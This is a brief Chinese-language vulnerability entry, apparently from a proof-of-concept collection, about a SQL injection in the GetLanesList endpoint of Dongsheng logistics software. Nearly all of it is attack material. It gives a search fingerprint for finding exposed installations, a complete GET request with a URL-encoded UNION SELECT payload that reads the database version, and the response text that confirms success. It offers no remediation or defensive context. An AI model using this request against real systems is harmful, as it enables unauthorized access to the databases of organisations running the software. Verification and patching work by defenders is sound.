# 东胜物流软件GetLanesList存在SQL注入漏洞

东胜物流软件 ｜ SQL注入 ｜ —
- **指纹**：`body="FeeCodes/CompanysAdapter.aspx"`
- **请求**：`GET /MvcShipping/MsCodeAll/GetLanesList?condition=1%3D1%20UNION%20ALL%20SELECT%20%40%40version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&sort=LANEID HTTP/1.1`
- **响应特征**：200 Microsoft